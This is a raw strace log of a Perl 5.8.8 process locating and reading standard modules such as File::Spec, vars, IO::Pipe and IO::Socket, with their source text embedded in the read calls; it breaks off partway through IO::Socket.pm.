5779  07:10:39.119625 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119639 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119651 stat64("/usr/lib/perl5/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119663 stat64("/usr/share/perl5/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119675 stat64("/usr/share/perl5/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119689 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119701 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119714 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.119727 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
5779  07:10:39.119748 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.119762 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.119773 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.119791 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
5779  07:10:39.119920 stat64("/etc/perl/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.119934 stat64("/etc/perl/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.119947 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.119963 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.119977 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.119989 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120004 stat64("/usr/lib/perl5/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.120015 stat64("/usr/lib/perl5/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120028 stat64("/usr/share/perl5/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.120040 stat64("/usr/share/perl5/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120052 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.120064 stat64("/usr/lib/perl/5.8/vars.pm", 0xbfbb6ebc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120078 stat64("/usr/share/perl/5.8/vars.pmc", 0xbfbb6fac) = -1 ENOENT (No such file or directory)
5779  07:10:39.120090 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
5779  07:10:39.120110 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
5779  07:10:39.120124 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb6cc8) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.120135 _llseek(10, 0, [0], SEEK_CUR) = 0
5779  07:10:39.120151 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
5779  07:10:39.120261 stat64("/etc/perl/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120276 stat64("/etc/perl/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120289 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120302 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120327 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120367 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120399 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120411 stat64("/usr/lib/perl5/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120424 stat64("/usr/share/perl5/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120437 stat64("/usr/share/perl5/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120454 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120467 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbfbb6a0c) = -1 ENOENT (No such file or directory)
5779  07:10:39.120481 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbfbb6afc) = -1 ENOENT (No such file or directory)
5779  07:10:39.120494 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
5779  07:10:39.120515 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
5779  07:10:39.120530 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb6818) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.120540 _llseek(11, 0, [0], SEEK_CUR) = 0
5779  07:10:39.120558 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
5779  07:10:39.120733 read(11, "", 4096) = 0
5779  07:10:39.120746 close(11)         = 0
5779  07:10:39.121041 _llseek(10, 1148, [1148], SEEK_SET) = 0
5779  07:10:39.121058 _llseek(10, 0, [1148], SEEK_CUR) = 0
5779  07:10:39.121068 close(10)         = 0
5779  07:10:39.121136 _llseek(8, 594, [594], SEEK_SET) = 0
5779  07:10:39.121149 _llseek(8, 0, [594], SEEK_CUR) = 0
5779  07:10:39.121159 close(8)          = 0
5779  07:10:39.121191 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121206 stat64("/etc/perl/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121220 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121233 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121247 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121260 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121275 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121287 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121300 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121350 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121398 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121426 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbfbb736c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121453 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbfbb745c) = -1 ENOENT (No such file or directory)
5779  07:10:39.121466 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
5779  07:10:39.121488 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
5779  07:10:39.121503 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7178) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.121514 _llseek(8, 0, [0], SEEK_CUR) = 0
5779  07:10:39.121532 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
5779  07:10:39.122206 brk(0x8218000)    = 0x8218000
5779  07:10:39.122403 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
5779  07:10:39.122768 read(8, "", 4096) = 0
5779  07:10:39.122783 close(8)          = 0
5779  07:10:39.123025 read(6, "", 4096) = 0
5779  07:10:39.123041 close(6)          = 0
5779  07:10:39.123204 stat64("/etc/perl/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123220 stat64("/etc/perl/IO/Pipe.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123234 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123246 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123260 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123276 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123291 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123314 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123355 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123384 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123397 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.123410 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
5779  07:10:39.123431 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.123445 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.123457 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.123478 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
5779  07:10:39.124159 _llseek(6, 3425, [3425], SEEK_SET) = 0
5779  07:10:39.124177 _llseek(6, 0, [3425], SEEK_CUR) = 0
5779  07:10:39.124188 close(6)          = 0
5779  07:10:39.124211 stat64("/etc/perl/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124225 stat64("/etc/perl/IO/Socket.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124239 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124251 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124265 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124278 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124301 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124344 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124373 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124386 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfbb781c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124400 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfbb790c) = -1 ENOENT (No such file or directory)
5779  07:10:39.124413 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
5779  07:10:39.124435 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 6
5779  07:10:39.124464 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbb7628) = -1 ENOTTY (Inappropriate ioctl for device)
5779  07:10:39.124475 _llseek(6, 0, [0], SEEK_CUR) = 0
5779  07:10:39.124492 read(6, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    